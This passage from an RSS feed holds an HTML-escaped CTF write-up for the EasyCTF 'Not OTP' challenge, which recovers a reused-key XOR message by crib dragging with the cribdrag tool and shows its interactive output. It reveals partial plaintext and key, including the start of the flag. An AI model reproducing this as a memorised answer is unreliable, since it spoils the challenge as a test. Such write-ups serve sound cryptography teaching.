-75: &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$m&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;|~of=&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; 76: &lt;span class=&quot;s2&quot;&gt;&quot;intext u&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; 77: &lt;span class=&quot;s2&quot;&gt;&quot;jfobc2hg&quot;&lt;/span&gt;
-78: &lt;span class=&quot;s2&quot;&gt;&quot;b}hy%zzj&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; 79: &lt;span class=&quot;s2&quot;&gt;&quot;yzs?mhwo&quot;&lt;/span&gt;
-80: &lt;span class=&quot;s2&quot;&gt;&quot;~a5wer&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;In one of this parts we see text that highly looks like part of the English sentence. Let’s take it’s position and place in the mesage.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Enter the correct position, &lt;span class=&quot;s1&quot;&gt;'none'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;no match, or &lt;span class=&quot;s1&quot;&gt;'end'&lt;/span&gt; to quit: 76
-Is this crib part of the message or key? Please enter &lt;span class=&quot;s1&quot;&gt;'message'&lt;/span&gt; or &lt;span class=&quot;s1&quot;&gt;'key'&lt;/span&gt;: message
-Your message is currently:
-0	________________________________________
-40	____________________________________easy
-80	ctf&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;___________________
-Your key is currently:
-0	________________________________________
-40	____________________________________inte
-80	xt u___________________&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;My next guess was word &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt;. Will it be a good one?&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;67: &lt;span class=&quot;s2&quot;&gt;&quot;*o-i&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; 68: &lt;span class=&quot;s2&quot;&gt;&quot;e of&quot;&lt;/span&gt;
-69: &lt;span class=&quot;s2&quot;&gt;&quot;*b&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;g&lt;span class=&quot;s2&quot;&gt;&quot;
-70: &quot;&lt;/span&gt;hma~&lt;span class=&quot;s2&quot;&gt;&quot;
-Enter the correct position, 'none' for no match, or 'end' to quit: 68
-Is this crib part of the message or key? Please enter 'message' or 'key': message
-Your message is currently:
-0	________________________________________
-40	____________________________flag____easy
-80	ctf{___________________
-Your key is currently:
-0	________________________________________
-40	____________________________e of____inte
-80	xt u___________________&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we can see that it’s getting more readable. After that we’re ready to add &lt;code class=&quot;highlighter-rouge&quot;&gt;is&lt;/code&gt; , but to make more readable strings, I decided to input whole &lt;code class=&quot;highlighter-rouge&quot;&gt;flag is easyctf{&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;66: &lt;span class=&quot;s2&quot;&gt;&quot;7 b+.hs9z vdh}{&quot;&lt;/span&gt;
-67: &lt;span class=&quot;s2&quot;&gt;&quot;*o-i!ij?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$m&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;|~of=&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; 68: &lt;span class=&quot;s2&quot;&gt;&quot;e of plaintext u&quot;&lt;/span&gt;
-69: &lt;span class=&quot;s2&quot;&gt;&quot;*b&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;g9v2,jfobc2hg&lt;span class=&quot;s2&quot;&gt;&quot;
-70: &quot;&lt;/span&gt;hma~?&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/b&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;hy%zzj&lt;span class=&quot;s2&quot;&gt;&quot;
-Enter the correct position, 'none' for no match, or 'end' to quit: 68
-Is this crib part of the message or key? Please enter 'message' or 'key': message
-Your message is currently:
-0	________________________________________
-40	____________________________flag is easy
-80	ctf{___________________
-Your key is currently:
-0	________________________________________
-40	____________________________e of plainte
-80	xt u___________________&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;After that part I was stuck for a while. I had no clue what to put there next, trying some random different characters until I noticed that there should be a space also before the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; word. This simple operation will add another letter into the key, which may help us find the right crib.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Enter the correct position, &lt;span class=&quot;s1&quot;&gt;'none'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;no match, or &lt;span class=&quot;s1&quot;&gt;'end'&lt;/span&gt; to quit: 67
-Is this crib part of the message or key? Please enter &lt;span class=&quot;s1&quot;&gt;'message'&lt;/span&gt; or &lt;span class=&quot;s1&quot;&gt;'key'&lt;/span&gt;: message
-Your message is currently:
-0	________________________________________
-40	___________________________ flag is easy
-80	ctf&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;___________________
-Your key is currently:
-0	________________________________________
-40	___________________________le of plainte
-80	xt u___________________&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;But no luck for me. After that part, my team mate proposed a word &lt;code class=&quot;highlighter-rouge&quot;&gt;sample&lt;/code&gt;, which gave pretty good results.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Enter the correct position, &lt;span class=&quot;s1&quot;&gt;'none'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;no match, or &lt;span class=&quot;s1&quot;&gt;'end'&lt;/span&gt; to quit: 62
-Is this crib part of the message or key? Please enter &lt;span class=&quot;s1&quot;&gt;'message'&lt;/span&gt; or &lt;span class=&quot;s1&quot;&gt;'key'&lt;/span&gt;: key
-Your message is currently:
-0	________________________________________
-40	______________________uess! flag is easy
-80	ctf&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;___________________
-Your key is currently:
-0	________________________________________
-40	______________________ sample of plainte
-80	xt u___________________
-Please enter your crib:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Lastly, after quite some time we were able to slowly reveal some parts of the message and key.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/easyctf/not_otp.png&quot; alt=&quot;Not OTP Solution&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;tools&quot;&gt;Tools&lt;/h3&gt;
-&lt;p&gt;&lt;a href=&quot;https://github.com/SpiderLabs/cribdrag1&quot;&gt;https://github.com/SpiderLabs/cribdrag&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
-&lt;p&gt;&lt;a href=&quot;https://travisdazell.blogspot.com/2012/11/many-time-pad-attack-crib-drag.html&quot;&gt;https://travisdazell.blogspot.com/2012/11/many-time-pad-attack-crib-drag.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Known-plaintext_attack&quot;&gt;https://en.wikipedia.org/wiki/Known-plaintext_attack&lt;/a&gt;&lt;/p&gt;
-</description>
-        <pubDate>Wed, 21 Feb 2018 03:00:00 +0100</pubDate>
-        <link>http://localhost:4000/easyctf-not-otp/</link>
-        <guid isPermaLink="true">http://localhost:4000/easyctf-not-otp/</guid>
       </item>
     
   </channel>
